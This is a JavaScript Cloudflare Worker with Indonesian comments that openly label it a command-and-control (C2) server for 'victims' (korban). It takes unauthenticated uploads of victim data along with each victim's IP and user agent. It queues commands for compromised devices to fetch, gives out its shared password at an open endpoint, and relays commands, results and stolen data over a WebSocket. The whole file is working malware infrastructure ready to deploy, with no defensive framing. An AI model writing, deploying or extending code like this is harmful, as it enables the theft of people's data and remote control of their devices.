// ================================================================
// CLOUDFLARE WORKER - verifikasi-api
// SINKRON 100% DENGAN 3 FILE ACUAN
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const MAX_DATA = 5000;

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
    },
  });
}

// ============================================================
// 🔥 AUTHENTICATION - HANYA 1 PASSWORD!
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.PASSWORD;  // 🔥 HANYA 1 PASSWORD!
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // ============================================================
    // 🔥 GET /get-password - KORBAN AMBIL PASSWORD
    // ============================================================
    if (url.pathname === '/get-password' && method === 'GET') {
      const password = env.PASSWORD || '';
      return jsonResponse({
        status: 'ok',
        password: password,  // 🔥 1 PASSWORD!
        timestamp: Date.now()
      });
    }

    // ============================================================
    // 🔥 POST /data - KORBAN KIRIM DATA (TANPA PASSWORD!)
    // ============================================================
    if (url.pathname === '/data' && method === 'POST') {
      return await handlePostData(request, env);
    }

    // ============================================================
    // 🔥 GET /data?type=perintah&password=xxx - SERVER → KORBAN (PAKAI PASSWORD!)
    // ============================================================
    if (url.pathname === '/data' && method === 'GET') {
      return await handleGetData(request, env);
    }

    // ============================================================
    // 🔥 WEBSOCKET /ws - PAKAI PASSWORD!
    // ============================================================
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // ============================================================
    // 🔥 HEALTH CHECK /
    // ============================================================
    if (url.pathname === '/' && method === 'GET') {
      const raw = await env.DATA.get('data') || '[]';
      const data = JSON.parse(raw);
      return jsonResponse({
        status: 'ok',
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        totalData: data.length,
        endpoints: {
          get_password: '/get-password',
          post_data: 'POST /data',
          get_command: 'GET /data?type=perintah&password=xxx',
          websocket: 'wss://' + url.host + '/ws'
        }
      });
    }

    // 404
    return jsonResponse({ error: 'Not Found' }, 404);
  }
};

// ============================================================
// 🔥 HANDLER: POST /data (KORBAN → SERVER - TANPA PASSWORD!)
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();

    if (!body || typeof body !== 'object') {
      return jsonResponse({ error: 'Invalid request body' }, 400);
    }

    // 🔥 C2 COMMAND (DARI DASHBOARD) - PAKAI PASSWORD!
    const url = new URL(request.url);
    const key = url.searchParams.get('key');
    if (key === env.PASSWORD && (body.sumber === 'c2_command' || body.type === 'c2_command')) {
      const cmdData = body.data || body;
      cmdData.timestamp = Date.now();
      cmdData.status = 'pending';
      await env.DATA.put('perintah', JSON.stringify(cmdData));
      return jsonResponse({
        status: 'ok',
        type: 'c2',
        command: cmdData.aksi
      });
    }

    // 🔥 DATA DARI KORBAN - TANPA PASSWORD!
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };

    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);

    if (data.length >= MAX_DATA) {
      data = data.slice(-MAX_DATA + 1);
    }

    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));

    return jsonResponse({
      status: 'ok',
      total: data.length,
    });

  } catch (error) {
    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
  }
}

// ============================================================
// 🔥 HANDLER: GET /data (SERVER → KORBAN - PAKAI PASSWORD!)
// ============================================================
async function handleGetData(request, env) {
  const url = new URL(request.url);
  const type = url.searchParams.get('type');
  const password = url.searchParams.get('password');

  // 🔥 AMBIL PERINTAH C2 (PAKAI PASSWORD!)
  if (type === 'perintah') {
    const correctPassword = env.PASSWORD || '';

    // 🔥 VERIFIKASI PASSWORD!
    if (password !== correctPassword) {
      return jsonResponse({
        status: 'error',
        message: 'Invalid password'
      }, 401);
    }

    try {
      const perintah = await env.DATA.get('perintah');
      if (perintah) {
        const cmd = JSON.parse(perintah);
        await env.DATA.delete('perintah');

        // 🔥 KIRIM PERINTAH + PASSWORD (UNTUK VERIFIKASI KORBAN)
        return jsonResponse({
          aksi: cmd.aksi,
          params: cmd.params || {},
          password: correctPassword,
          timestamp: Date.now()
        });
      }
      return jsonResponse({});
    } catch (e) {
      return jsonResponse({});
    }
  }

  // 🔥 GET BIASA - LIHAT DATA (PAKAI PASSWORD!)
  if (!isAuthenticated(request, env)) {
    return jsonResponse({ error: 'Access Denied' }, 403);
  }

  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);

    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }

    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
    }

    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    }

    return jsonResponse(data);

  } catch (e) {
    return jsonResponse([]);
  }
}

// ============================================================
// 🔥 HANDLER: WEBSOCKET /ws (PAKAI PASSWORD!)
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);
  server.accept();

  let authenticated = false;
  let deviceId = 'unknown';

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);

      // ============================================================
      // 🔥 AUTHENTIKASI - HANYA 1 PASSWORD!
      // ============================================================
      if (data.type === 'auth') {
        const key = data.key || '';
        const correctPassword = env.PASSWORD || '';

        if (key === correctPassword) {
          authenticated = true;
          deviceId = data.deviceId || 'unknown';
          server.send(JSON.stringify({
            type: 'auth_success',
            role: 'device'
          }));
          console.log('✅ WS Authenticated:', deviceId);
        } else {
          server.send(JSON.stringify({ type: 'auth_failed' }));
          server.close(1008, 'Auth failed');
        }
        return;
      }

      // 🔥 JIKA BELUM AUTH, TOLAK SEMUA PERMINTAAN
      if (!authenticated) {
        server.close(1008, 'Unauthorized');
        return;
      }

      // ============================================================
      // 🔥 COMMAND DARI DASHBOARD → Simpan perintah
      // ============================================================
      if (data.type === 'command') {
        const correctPassword = env.PASSWORD || '';
        const cmdData = data.command || {};
        cmdData.timestamp = Date.now();
        cmdData.status = 'pending';
        cmdData.password = correctPassword;
        
        await env.DATA.put('perintah', JSON.stringify(cmdData));
        server.send(JSON.stringify({
          type: 'command_received',
          command: cmdData.aksi || 'unknown'
        }));
        return;
      }

      // ============================================================
      // 🔥 DATA DARI KORBAN (TANPA PASSWORD)
      // ============================================================
      if (data.type === 'data' || data.type === 'result') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);

        allData.push({
          waktu: new Date().toISOString(),
          sumber: data.type === 'result' ? 'c2_result' : 'websocket',
          data: data.data || data,
          deviceId: deviceId
        });

        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }

        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'saved' }));
        return;
      }

      // ============================================================
      // 🔥 PING/PONG (KEEP-ALIVE)
      // ============================================================
      if (data.type === 'ping') {
        server.send(JSON.stringify({
          type: 'pong',
          timestamp: data.timestamp || Date.now()
        }));
        return;
      }

      // DEFAULT - ECHO
      server.send(JSON.stringify({ type: 'echo', data: data }));

    } catch (e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  server.addEventListener('close', () => {
    console.log('❌ WS Closed:', deviceId);
  });

  return new Response(null, {
    status: 101,
    webSocket: client,
  });
}
